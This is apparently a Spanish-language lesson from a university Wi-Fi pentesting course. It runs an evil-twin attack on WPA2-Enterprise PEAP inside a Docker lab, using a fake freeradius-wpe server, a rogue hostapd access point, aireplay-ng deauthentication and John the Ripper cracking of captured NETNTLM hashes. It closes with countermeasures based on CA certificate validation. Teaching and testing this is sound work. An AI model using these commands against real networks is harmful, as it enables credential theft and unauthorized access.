# TFG-Pentesting
## Introducción
Finalmente es turno de poner a prueba uno de los protocolos de seguridad Wi-Fi que se consideran más robustos, la versión Enterprise de WPA/WPA2. Un protocolo que cambia la autenticación mediante una clave precompartida, por otra que usa un servidor que refuerza el proceso de autenticación. Además, se seguirá la metodología habitual para efectuar los ataques oportunos y mostrar las contramedidas o recomendaciones que pueden ayudar a frenarlos.

## Protocolos de Seguridad WPA/WPA2 EAP
En la versión Enterprise de estos protocolos WPA y WPA2, se aprecia el uso de un servidor RADIUS que es ahora el encargado de autenticar a los diferentes clientes en sustitución de la PSK:
![image](https://github.com/user-attachments/assets/cbfbf8f3-7533-4f6c-86ae-45293f0bef04)

La seguridad de este tipo de protocolos se basa principalmente en un secreto que solo conocen el usuario legítimo y el servidor RADIUS. Este secreto puede ser de varios tipos (usuario y contraseña, certificado digital, etc.) según el EAP Type. Dependiendo del tipo de autenticación elegida, el nivel de seguridad será mayor o menor. En el caso de este estudio se escoge el nivel PEAP, el cual consiste en una autenticación usuario-contraseña protegida por TLS en la comunicación para su comprobación. [[40](https://ieeexplore.ieee.org/abstract/document/8289808?casa_token=nGwDxRuO2XAAAAAA:X-DolgsMBTtaIVsijXXjFSRyvUGe1AJ6SJB6HROKB8tSaKYEWq8i5qklJglhlBGADXAoTGqOW24L)]

### Vulnerabilidades
Algunos ataques eficaces contra este tipo de sistema son:
- **KRACK:**
  Permite al atacante reinstalar una clave ya utilizada, lo que puede llevar a la reutilización de NONCES y, por ende, a la posibilidad de descifrar el tráfico cifrado. Este ataque funciona tanto en las versiones PSK como Enterprise, lo cual hace que sea realmente dañino. [[41](https://ieeexplore.ieee.org/document/10041548)]
- **Rouge AP:**
  Es un tipo de ataque que busca el robo de claves de autenticación o de la información legítima de un usuario basándose en la confianza que este establece con un punto de acceso en el que confía. En concreto, busca hacer pasar un dispositivo por el punto de acceso legítimo al que desea conectarse el usuario, haciendo que este no sea capaz de diferenciarlo del original. Con esto, puede obtener las claves de acceso cuando el usuario intente conectarse a él o incluso seguir fingiendo ser el punto de acceso legítimo para robar datos sensibles de las comunicaciones futuras. [[40](https://ieeexplore.ieee.org/abstract/document/8289808?casa_token=nGwDxRuO2XAAAAAA:X-DolgsMBTtaIVsijXXjFSRyvUGe1AJ6SJB6HROKB8tSaKYEWq8i5qklJglhlBGADXAoTGqOW24L)]

## Atacando WPA/WPA2
En esta sección se trata con uno de los protocolos más difíciles de atacar en cuanto a aprovechar un fallo de este mismo. Es por tanto que el ataque que se explicará se basará en una posible mala configuración  que típicamente es la configuración por defecto. Normalmente un cliente que desea conectarse a un punto de acceso con servidor RADIUS lo hace usando un certificado que ofrece dicho servidor de autenticación (se trata de un uso similar al realizado por una página web con HTTPS para poder empezar la comunicación de autenticación y "demostrar" que el servidor es legítimo). 

De esta forma, el proceso de ataque consistirá en crear un punto de acceso y servidor RADIUS falsos que ofrezcan un certificado también falso a los clientes legítimos (los del punto de acceso real). Con esto el servidor pedirá a estos clientes sus credenciales, lo cual debería ser rechazado. Sin embargo, es muy común que por defecto estos clientes tengan una configuración que acepte cualquier certificado proveniente de un servidor de autenticación y posteriormente efectúen el proceso de autenticación (enviar sus credenciales) con dicho servidor. Esto permite a los atacantes obtener credenciales válidas con las cuales pueden conectarse al punto de acceso legítimo suplantando la identidad de un usuario autorizado para este acceso.

Para empezar con este proceso de ataque se debe arrancar el laboratorio (en esta misma rama) e iniciar la máquina del atacante:
```
sudo ./launch.sh
docker-compose exec attacker-1 bash
```
Ahora se puede proceder a ejecutar `airmon-ng` junto a `airodump-ng` para visualizar los detalles de la red que se desea atacar y confirmar que se trata de WPA/WPA2 en modo Enterprise. Además, para no interferir en el comportamiento de la interfaz de red atacante que se usará como punto de acceso falso, se desactiva el modo monitor al terminar esta acción:
```
airmon-ng start wlan4
airodump-ng wlan4mon
# Desactivar cuando no se quiera usar más
airmon-ng stop wlan4mon
```
`Recordatorio:` La interfaz en modo monitor puede darse con igual nombre o alguno similar a `wlan4mon`, se aconseja revisar esto y el nombre de la interfaz original con `ifconfig`.
<img width="862" height="311" alt="image" src="https://github.com/user-attachments/assets/b0b8ac13-3dbf-43e0-aee8-77fc44f368ac" />
<img width="1020" height="191" alt="image" src="https://github.com/user-attachments/assets/04303785-cf20-48a1-8c40-10973bb1ec3f" />

`Nota: ` En este laboratorio se usan dos interfaces inalámbricas para el atacante con objeto de usar el modo monitor (típicamente se usará `wlan4`) y el modo punto de acceso (típicamente se usará `wlan5`) de manera simultánea.

En este caso se aprecia que se trata de WPA2 Enterprise gracias al campo `AUTH` que contine el valor `MGT` (Management), es decir, autenticación gestionada por servidor (en este caso un servidor RADIUS). Una vez se confirma el tipo de protocolo que usa el punto de acceso se puede proceder a crear un servidor RADIUS falso (en la máquina del atacante) que se usará como servidor de autenticación. 

`Nota: ` Aún no se conoce el tipo exacto de autenticación EAP, se supone como PEAP (usuario y contraseña), aunque esto se podrá confirma mediante prueba y error o simplemente analizando el tráfico de esta primera configuración en caso de no ser la acertada (RADIUS registrará los intentos de conexión en los cuales se define el tipo de identificación).

En primer lugar, habría que instalar `freeradius` (en Kali Linux `freeradius-wpe`) para poder crear el servidor RADIUS, sin embargo, esta herramienta ya viene instalada en el laboratorio. De esta forma, se puede proceder a configurar el servidor de autenticación, empezando por el fichero `clients.conf` localizado en `/etc/freeradius`, el cual guarda las configuraciones de los clientes que se pueden conectar a este servidor y cómo lo pueden hacer. Para nuestra labor basta con:
```
client 127.0.0.1 {   
    Secret  = malicious123
    Shortname = fake-radius
}
```
- `client <IP>: ` rango de direcciones IP que pueden conectarse al servidor RADIUS (solo nos interesa la conexión desde la propia máquina atacante que también actuará como punto de acceso).
- `Secret: ` clave precompartida entre cliente (punto de acceso en nuestro caso) y servidor RADIUS para cifrar los mensajes intercambiados.
- `Shortname: ` identificador simbólico del cliente (sin mayor importancia).
```
nano /etc/freeradius/clients.conf
```

`Nota: ` Se recomienda cambiar las claves y nombres para comprender correctamente el funcionamiento y no limitarse a copiar y pegar, haciendo los cambios siempre en todos los lugares donde aparezcan.

Siguiendo con la configuración del servidor RADIUS, se pasa al fichero `/etc/freeradius-wpe/3.0/mods-config/files/authorize` (o `/etc/freeradius/users` dependiendo de la versión), el cual contiene las credenciales de los usuarios autorizados a conectarse al punto de acceso WPA/WPA2 que se creará más tarde (en este caso se trata del punto de acceso falso del atacante). Aquí basta con añadir un usuario cualquiera que nos permita probar el correcto funcionamiento del servidor:
```
# Añadir al fichero un usuario del tipo:
# Formato: "<usuario>"	Cleartext-Password := "<contraseña>"
"carlos"	Cleartext-Password := "test"
```
<img width="525" height="160" alt="image" src="https://github.com/user-attachments/assets/a90e9c9c-5c28-4fc2-893b-9977e54a3c7f" />

Esto se debe a que no buscamos que se conecten usuarios legítimos a nuestro punto de acceso, sino que buscamos capturar la información necesaria para obtener credenciales válidas en otro punto de acceso. La idea es que al fallar esas credenciales que buscamos se registren los datos necesarios (`Challenge` y su correspondiente `Response`) para poder obtenerlas con un ataque de fuerza bruta más tarde.

Por otro lado, se debe comprobar en el fichero `/etc/freeradius-wpe/3.0/mods-available/eap` (o `eap.conf` dependiendo de la versión de `freeradius`) que la configuración del tipo de autenticación (EAP Type) es la correcta, es decir, que es `PEAP` (usuario y contraseña comunicados mediante un túnel TLS):
```
eap {
  	# ...
  	default_eap_type = peap
  	timer_expire = 60
    # ...
}
```
- `default_eap_type: ` EAP Type por defecto que adoptará el servidor RADIUS.
<img width="530" height="159" alt="image" src="https://github.com/user-attachments/assets/6d21b8ae-40b2-4bc4-9dbd-9d2557de78bc" />

Además, en este mismo fichero, se debe abrir el rango de versiones TLS aceptadas, ya que si los clientes no aceptan estas mismas versiones preconfiguradas (normalmente solo se acepta la 1.2), no se podrá continuar la comunicación y por tanto el ataque no tendrá éxito:
```
eap {
    # ...
	  tls-config tls-common {
        # ...
        tls_min_version = "1.0"
		    tls_max_version = "1.3"
        # ...
    }
    # ...
}
```
- `tls_min_version: ` versión mínima aceptada por freeradius-wpe de TLS.
- `tls_max_version: ` versión máxima aceptada por freeradius-wpe de TLS.
<img width="589" height="210" alt="image" src="https://github.com/user-attachments/assets/d3585e80-18b3-4d70-b2ff-eff52e445338" />


Ahora es turno de establecer la configuración necesaria para poder registrar los intentos de autenticación, tanto los fallidos como los válidos. Esto se realiza para poder obtener los datos necesarios que se usarán en el proceso de crackear las credenciales, tal y como se comentó anteriormente. Nuevamente se debe comprobar una configuración similar a la siguiente en `radius.conf` (también localizado en `/etc/freeradius-wpe/3.0`):
```
log {
    # ...
    auth = yes
  	auth_badpass = yes
  	auth_goodpass = yes
    # ...
}
```
- `auth = yes`: Guarda en el log tanto los intentos fallidos de autenticación (Access-Reject), como los acertados (Access-Accept). 
- `auth_badpass = yes`: Guarda en el log las contrseñas de los intentos fallidos. 
- `auth_goodpass = yes`: Guarda en el log las contrseñas de los intentos acertados.
<img width="695" height="674" alt="image" src="https://github.com/user-attachments/assets/0b8a9e2d-b950-4ec3-9fda-c1364fca4a5c" />

Con esto se concluye toda la configuración del servidor RADIUS que se levantará en `localhost` del atacante para gestionar la autenticación al punto de acceso falso basado en WPA/WPA2 Enterprise que se creará a continuación. En este punto ya se puede lanzar el servidor RADIUS:
```
freeradius-wpe -i 127.0.0.1 -p 1812 
```
* `-i:` IP en la que escucha el servidor RADIUS.
* `-p:` puerto en el que escucha el servidor RADIUS (por defecto suele ser el 1812).
* `-X:` opcional para ejecutar en primer plano.

Pasando a la configuración del punto de acceso, se debe empezar fijando la IP de dicho punto de acceso de cara a los usuarios que se conecten a él, así como la configuración de DHCP que luego reparta las IPs entre esos usuarios conectados (se usa una subred diferente para poder comprobar a que punto de acceso nos conectamos):
```
# IP del punto de acceso (de su interfaz inalámbrica)
ip addr add 10.5.2.193/26 dev wlan5
```
`Nota: ` Comprobar con `ifconfig` que la interfaz del atacante `wlan4` y cambiar el comando con el nombre real en caso de no ser así.

```
# Configuracion DHCP guardada en /etc/dhcp/dhcpd.conf
ddns-update-style interim;
ignore client-updates;
authoritative;

subnet 10.5.2.192 netmask 255.255.255.192 {
    range  10.5.2.194 10.5.2.254;   				                    # Rango de IPs (10.5.2.192/26) que se repartiran entre los usuarios conectados
    option subnet-mask 255.255.255.192;    			                # Mascara de subred que usaran los usuarios conectados
    option broadcast-address 10.5.2.255;  			                # Dirección de broadcast usada por los usuarios coenctados
    option routers 10.5.2.193;         				                  # Gateway usado por defecto por los usuarios conectados (IP del punto de acceso)
    option domain-name-servers 10.5.2.193, 8.8.8.8, 8.8.4.4;  	# IPs de los DNS por defecto usadas por los usuarios conectados

    default-lease-time 21600;    				                        # Tiempo en segundos hasta que expire la IP actual de cada usuario conectado
    max-lease-time 43200;
}

```
```
# Ejemplo de como editarlo y/o cearlo
nano /etc/dhcp/dhcpd.conf
```

Con esta configuración ya se puede arrancar el servicio DHCP mediante el comando:
```
# Matar proceso DHCP anterior
pkill dhcpd
# Configurar ficheros necesarios para DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Lanzar servicio DHCP
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
```
* `-cf /etc/dhcp/dhcpd.conf:` ubicación del fichero de configuración DHCP (en este caso se podría omitir al encontrarse en la ubicación por defecto).
* `wlan4:` interfaz donde se levantará el servicio DHCP (interfaz que actuará como punto de acceso).

Por otro lado, sería recomendable dar acceso a Internet a los clientes que se conectan, aunque esta acción no es necesaria (ni posible debido a la falta de una interfaz cableada conectada a Internet en la máquina del atacante). Esto se puede realizar mediante el uso de reglas `iptables` (reglas de firewall en entornos Linux) similares a las siguientes (estan son usadas en la definción del punto de acceso legítimo):
```
# Permitir el paso a través de paquetes
echo 1 > /proc/sys/net/ipv4/ip_forward

# Tirar todo el tráfico que pase a través de la máquina
iptables -P FORWARD DROP

# Permitir únicamente el tráfico a través de la WLAN creada
iptables -A FORWARD -i wlan5 -o wlan5 -s 10.5.2.193/26 -d 10.5.2.193/26 -j ACCEPT

# Permitir únicamente el tráfico a través de la red inalámbrica (y enmascarar este) a la cableada  
iptables -A FORWARD -s 10.5.2.193/26 -i wlan5 -o eth0 -j ACCEPT
iptables -A FORWARD -d 10.5.2.193/26 -i eth0 -o wlan5 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.5.2.193/26 -o eth0 -j SNAT --to 10.5.2.24

# Permitir tráfico loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
```
Esto podría ser de ayuda para no ser detectados si por cada intento fallido registramos las credenciales de los usuarios en `/etc/freeradius/users`, de forma que luego podríamos efectuar fácilmente un ataque de tipo MITM aprovechando que la comunicación habitual ya pasa por nuestro punto de acceso. Este tipo de ataque, el cual se detallará en el próximo capítulo, consiste en imitar un punto de acceso legítimo para robar o modificar la información que transcurre a través de él.

Con todo esto configurado, solo falta definir el punto de acceso a través de la herramienta `hostapd` (ya instalada en la máquina atacante), la cual ha sido usada a lo largo de todo el laboratorio para configurar los distintos puntos de acceso WiFi con sus respectivas diferencias en cuanto a protocolos de seguridad. Para ello se usa el fichero de configuración `hostapd.conf` definido de la siguiente forma:
```
# Configuracion WPA2
interface=wlan5
ssid=WPA-EAPnetwork
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# Configuracion de autenticacion con RADIUS
ieee8021x=1
eapol_version=1
eap_message="Bienvenido a la red del atacante"
eap_reauth_period=3600

# Si se hace copia-pega de este fichero se recomienda eliminar los 
# siguientes comentarios para un correcto funcionamiento de la herramienta
own_ip_addr=10.5.2.193                      # IP del punto de acceso 
nas_identifier=carlos.in                    # Identificador simbolico (sin mucha importancia)
auth_server_addr=127.0.0.1                  # IP del servidor RADIUS
auth_server_port=1812                       # Puerto del servidor RADIUS
auth_server_shared_secret=malicious123      # Secreto compartido con RADIUS (clients.conf)
```

Finalmente se lanza la herramienta `hostapd` para acabar de configurar el punto de acceso falso que usará RADIUS a forma de servidor de autenticación:
```
pkill hostapd    # Matar proceso hostapd anterior
hostapd hostapd.conf -B
```
* `hostapd.conf:` fichero de configuración que define los detalles del punto de acceso.
* `-B:` ejecutar en segundo plano.

Tras esto, conviene probar que se ha creado con éxito el servidor RADIUS y el respectivo punto de acceso al que auténtica. Para esta labor se creó el usuario "carlos" con clave "test" en `authorize`, de forma que solo hace falta conectarse con dichas credenciales y comprobar que se obtiene una IP válida en el rango definido por DHCP. Esto se puede hacer gracias a `wpa_supplicant`, la herramienta que se ha usado a lo largo de la construcción del laboratorio para conectarse a los distintos puntos de acceso creados. En primer lugar, se comprueba con `airodump-ng` la existencia del nuevo punto de acceso creado:
```
airodump-ng wlan4mon
# Desactivar cuando no se quiera usar más
airmon-ng stop wlan4mon
```
<img width="1007" height="286" alt="image" src="https://github.com/user-attachments/assets/ad6765bd-6999-4793-8fe5-1a63f920404d" />

Al ver que existen dos puntos de acceso de igual `SSID` (pero distinta MAC) se intenta la conexión desde la interfaz de red secundaria que ahora tiene el atacante, `wlan4` (tras parar el modo monitor, ya que se desea conexión, no escuchar todos los mensajes que estén al alcance). Para ello se crea el siguiente `wpa_supplicant.conf` (ya presente en la máquina atacante):
```
# Ejemplo de como ver o modificar el contenido
# (modificar en caso de haber cambiado las credenciales)
nano wpa_supplicant.conf
```
```
# Contenido del fichero wpa_supplicant.conf 
# Tambien se puede usar este fichero directamente para probar 
network={
    ssid="WPA-EAPnetwork"
	# Se especifica la MAC del AP atacante para asegurar conexion a este
    bssid=02:00:00:00:05:00
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="carlos"
    password="test"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```

Tras esto, se ejecuta la herramienta en segundo plano para que realice intentos de conexión continuamente:
```
pkill wpa_supplicant    # Matar proceso wpa_supplicant anterior
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
```
* `-i:` interfaz usada para la conexión.
* `-c:` localización del fichero de configuración que define las credenciales de acceso.
* `-B:` ejecutar en segundo plano.

Una vez hecha la autenticación (si tiene éxito), se puede usar la herramienta `dhclient` para pedirle al servidor DHCP instaurado en la máquina que actúa como punto de acceso (máquina atacante en este caso) una IP válida:
```
# Cambiar la interfaz en función del cliente usado
dhclient wlan4
```
<img width="721" height="819" alt="image" src="https://github.com/user-attachments/assets/2b4d1995-4647-4e32-b544-fd52499db89c" />

`Nota: ` Todos los ficheros de configuración descritos hasta ahora se encuentran dentro de la máquina atacante en `/ap`, de tal forma que copiándolos directamente en su respetiva localización ya estaría todo correctamente configurado. Sin embargo, se aconseja realizar la configuración manualmente, así como un estudio del resto de parámetros de los distintos ficheros para comprender mejor el funcionamiento tanto del ataque como de un servidor RADIUS o una conexión inalámbrica mediante `hostapd` y `wpa_supplicant`, herramientas usadas en la construcción del entorno inalámbrico del laboratorio.

Aquí se aprecia como la interfaz del atacante que actúa como cliente (`wlan4`) se conecta al punto de acceso creado en otra interfaz de la misma máquina (`wlan5`) con éxito, ya que se encuentra en el rango de IPs ofrecido por el servicio DHCP de este (`10.5.2.192/26`). Por otro lado, se puede ver en `/var/log/freeradius-wpe/radius.log` y `/var/log/freeradius-wpe/freeradius-server-wpe.log` con más detalles si el intento de conexión ha sido aceptado por el servidor RADIUS:
```
cat /var/log/freeradius-wpe/radius.log
cat var/log/freeradius-wpe/freeradius-server-wpe.log 
```
<img width="1450" height="646" alt="image" src="https://github.com/user-attachments/assets/624db0ca-8eaa-4003-b429-816d48cc2f4d" />

`Nota: ` Se aconseja observar que pasa si se intenta una conexión con una clave o usuario no registrado, de forma que se comprenda mejor el funcionamiento de un punto de acceso con RADIUS como servidor de autenticación.

```
pkill wpa_supplicant    # Matar proceso wpa_supplicant anterior
nano wpa_supplicant.conf  
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
cat /var/log/freeradius-wpe/radius.log
# Este es el realmente interesante para el ataque
cat /var/log/freeradius-wpe/freeradius-server-wpe.log 
```

Una vez visto que todo funciona correctamente es turno de conseguir las credenciales de los clientes conectados al punto de acceso legítimo. Para ello la idea es aprovechar que estarán configurados para conectarse al punto de acceso con `SSID` igual a `WPA-EAPnetwork`. Sin embargo, lo más posibles es que no tengan configurada la `MAC` exacta del dispositivo legítimo o alguna otra configuración que permita identificar inequívocamente el dispositivo legítimo de otro falso con igual `SSID`. Es aquí donde entra la importancia de haber dejado un `SSID` idéntico en el punto de acceso falso, de forma que basta con forzar la desconexión de los clientes del dispositivo legítimo para que quepa la posibilidad de que se conecte alguno al dispositivo falso:
```
# En otra terminal (forzar canal para aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# En otra terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 1000 -a 02:00:00:00:00:00 wlan4mon
```
- `-0`: deauthentication (ataque que fuerza deautenticaciones).
- `1000`: número de mensajes de deautenticación enviados (valor alto para asegurar una desconexión durante un tiempo suficiente para que se conecten al AP falso).
- `-a 02:00:00:00:00:00`: dirección MAC del punto de acceso.
- `-c 02:00:00:00:02:00`: dirección MAC del cliente al que deautenticar (opcional, ya que en este caso en mejor que se lance a todos).
- `wlan4`: nombre de la interfaz usada.
<img width="793" height="489" alt="image" src="https://github.com/user-attachments/assets/ce3a25f0-14c4-4de4-bfbe-748ce5c3b2ec" />
<img width="949" height="375" alt="image" src="https://github.com/user-attachments/assets/c14a3384-f439-4ab0-89fb-28a183fa85f2" />

`Nota: ` También es posible hacer este ataque de forma menos intrusiva (sin forzar desconexiones) para tener menos riesgo de ser detectados. Esto se podría hacer aprovechando la configuración de conexiones automáticas a puntos de acceso conocidos (muy típica) una vez la víctima (un usuario cualquiera) se encuentra fuera de rango del dispositivo legítimo. Por otro lado, también se podrían aprovechar técnicas relacionadas con tener una señal más potente que el dispositivo legítimo, haciendo que la víctima prefiera el dispositivo con mejor señal. Sin embargo, en este laboratorio conviene forzar la desconexión del dispositivo legítimo debido a que no hay diferencia de potencia de señal al tratarse de una simulación, aunque si es posible y aconsejable parar el punto de acceso legítimo para simular el primer caso propuesto.

Tras esto, basta con dirigirnos a `/var/log/freeradius-wpe/freeradius-server-wpe.log` para ver los `challenge` (número aleatorio que envía el servidor RADIUS al cliente) y el `challenge respose` (hash creado con la contraseña del usuario que se intenta conectar y dicho challenge que sirve para comprobar la identidad de forma segura) que permitirán obtener las contraseñas reales gracias a un proceso de crackeo:
```
cat /var/log/freeradius-wpe/freeradius-server-wpe.log 
```
<img width="1069" height="677" alt="image" src="https://github.com/user-attachments/assets/d6308ee6-2ef7-4460-b444-89879c43dd8a" />


Aquí se aprecia tanto el usuario, como los mensajes de interés mencionados. Con todo esto se puede generar un hash de la forma que viene tras `john NETNTLM:`, lo cual representa una cadena lista para ser crackeada por la herramienta [`John the Ripper`](https://www.openwall.com/john/), una de las herramientas más famosas de crackeo (también se aprecia como se puede formar fácilmente a partir del resto de datos si esta cadena no viene dada). De esta forma, se puede crear un fichero `hashes.txt` que contenga estas cadenas para pasárselo a la herramienta `john`:
```
nano hashes.txt
```
```
# Contenido de hashes.txt
carlos:$NETNTLM$84b2be27eb7aadc3$50da229024b40a9ac203be9e8bba06c7095692ce92799803
client1:$NETNTLM$92634e7820125b63$628b402f255260eda1d4b9fb95937163c49cfc968f53ef5d
client2:$NETNTLM$1fff09f40a612c88$a2adb54c1af413a7e8164295a7e8462443f6c5030672d426
client3:$NETNTLM$279ed68695cdff89$20f8792e8ed7387b48ec8e442b180e66fcdc05866444407d
```

Con esto, sumado a un diccionario de posibles claves como el usado en el capítulo [`WPA/WPA2-PSK`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPA/WPA2-PSK), `/usr/share/wordlists/rockyou.txt`, se puede lanzar la herramienta de crackeo con objeto de obtener las contraseñas reales de los usuarios capturados:
```
# Lanzar la herramienta
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlm hashes.txt
```
* **--wordlist=/usr/share/wordlists/rockyou.txt:** diccionario de pruebas.
* **--format=netntlm:** formato de la cadena que compone el hash (en este caso se ve claramente en el log de RADIUS).
* **hashes.txt:** fichero que contiene los hashes que se desean crackear.
<img width="1090" height="311" alt="image" src="https://github.com/user-attachments/assets/1c34be03-7017-4f07-a70f-380a3c4977b1" />

Con esto se obtienen las claves y es posible conectarse al dispositivo legítimo con estas. Por último, se aconseja investigar cómo modificar `wpa_supplicant.conf` en el atacante para poder conectarse al punto de acceso legítimo con `wlan4` usando cualquiera de las credenciales de los usuarios legítimos.
<img width="712" height="792" alt="image" src="https://github.com/user-attachments/assets/fef0146f-b265-4bd5-ae49-6f29b0268e0f" />


`Recordatorio: ` Se aconseja también repetir los [ataques](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/Attacks) realizados tras conseguir acceso con la configuración de este capítulo para ver que una vez dentro la seguridad elegida en el punto de acceso es irrelevante, permitiendo así los mismos resultados. 

### Contramedidas y recomendaciones
La mejor forma de parar este tipo de ataque es revisando tanto los dispositivos clientes como el dispositivo que actúa como punto de acceso, de tal forma que se ajusten correctamente sus configuraciones en lugar de usar las que vienen por defecto. De nada sirve una autenticación tan robusta si se dejan pequeños detalles que conllevan a ataques como el recién visto. Es así que lo ideal sería ajustar correctamente configuraciones como solo aceptar certificados firmados por una Autoridad de Certificación (`CA` por sus siglas en inglés), en lugar de cualquier otro certificado. Esto hace que se pueda identificar inequívocamente el punto de acceso legítimo, evitando así la conexión a puntos de acceso falsos que busquen obtener nuestras credenciales. Además, puede resultar interesante añadir protecciones similares en el punto de acceso para evitar la conexión de clientes no válidos.

`Nota: ` Otras medidas como conectarse a una MAC específica pueden resultar algo débiles, ya que existen herramientas como `macchanger` que permiten cambiar este parámetro en un dispositivo atacante.

Para poder apreciar el potencial de estas acciones, se repetirá el ataque haciendo algunos ajustes para que los clientes usen `wpa_supplicant` configurado para conectarse únicamente con el punto de acceso legítimo. Para ello se ajusta `wpa_supplicant.conf` para que acepte únicamente certificados firmados con la `CA` usada por el servidor RADIUS legítimo (se encuentra y se copia de `/etc/freeradius/certs/ca.pem` en los clientes):
```
network={
    ssid="WPA-EAPnetwork"
	# Uso del certificado de la CA
    ca_cert="/etc/ssl/certs/ca.pem"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="client3"
    password="EAPpassw0rd3"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```

Para hacer que esto funcione correctamente se aconseja reiniciar el laboratorio y repetir el ataque, no sin antes aplicar las configuraciones seguras de `wpa_supplicant` en los clientes (`client-1`, `client-2` y `client-3`). Para ello se accede a [`Dockerfile client12`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/blob/WPA/WPA2-RADIUS/internal/wireless/client12/Dockerfile) para `client-1` y `client-2`, así como a [`Dockerfile client3`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/blob/WPA/WPA2-RADIUS/internal/wireless/client3/Dockerfile) para `client-3`, comentando las configuraciones `wpa_supplicant.conf` originales y descomentando las terminadas en `secure`:
<img width="680" height="163" alt="image" src="https://github.com/user-attachments/assets/aad38a2b-3b13-4baf-b7cf-abe1f4c89d04" />
<img width="575" height="113" alt="image" src="https://github.com/user-attachments/assets/ae4ec66f-ba21-4bf0-b3a4-d64540ffd61e" />

Una vez realizado esto, se lanza de nuevo el laboratorio y el ataque, siguiendo los pasos anteriores (se aconseja descomentar en [`Dockerfile de attacker`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/blob/WPA/WPA2-RADIUS/internal/wireless/attacker/Dockerfile) los `COPY` que copian directamente la configuración de `freeradius-wpe` en la ubicación que esta espera):
```
# Levantar AP y RADIUS falso
freeradius-wpe -i 127.0.0.1 -p 1812
# IP del punto de acceso (de su interfaz inalámbrica)
ip addr add 10.5.2.193/26 dev wlan5
# Matar proceso DHCP anterior
pkill dhcpd
# Configurar ficheros necesarios para DHCP 
touch /var/lib/dhcp/dhcpd.leases
chown root:root /var/lib/dhcp/dhcpd.leases
# Lanzar servicio DHCP
dhcpd -cf /etc/dhcp/dhcpd.conf wlan5
pkill hostapd    # Matar proceso hostapd anterior
hostapd hostapd.conf -B

# Forzar desconexión de los clientes legítimos
# En otra terminal (forzar canal para aireplay)
docker-compose exec attacker-1 bash
airmon-ng start wlan4
airodump-ng -c 6 wlan4mon
# En otra terminal 
docker-compose exec attacker-1 bash
aireplay-ng -0 1000 -a 02:00:00:00:00:00 wlan4mon

# Comprobar hashes capturados (no debería haber)
cat /var/log/freeradius-wpe/freeradius-server-wpe.log
```
<img width="940" height="296" alt="image" src="https://github.com/user-attachments/assets/1f42fc2d-dec0-4e2f-abb5-0980287ea3dc" />


<img width="909" height="441" alt="image" src="https://github.com/user-attachments/assets/33004885-cfd8-4c4f-b1db-3eb874d1544c" />

<img width="806" height="826" alt="image" src="https://github.com/user-attachments/assets/f14dafd0-3d20-4e55-ba53-9e43ba51e7f7" />

Con esto se ve una primera configuración que añadiría seguridad, sin embargo, podría reforzarse si se incluye el certificado o un hash que represente únicamente a el servidor RADIUS legítimo.

[`Lección anterior, cracking de redes WPS`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/WPS)
[`Siguiente lección, capítulo extra: WPA3 y RogueAP`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course/tree/RougeAP)
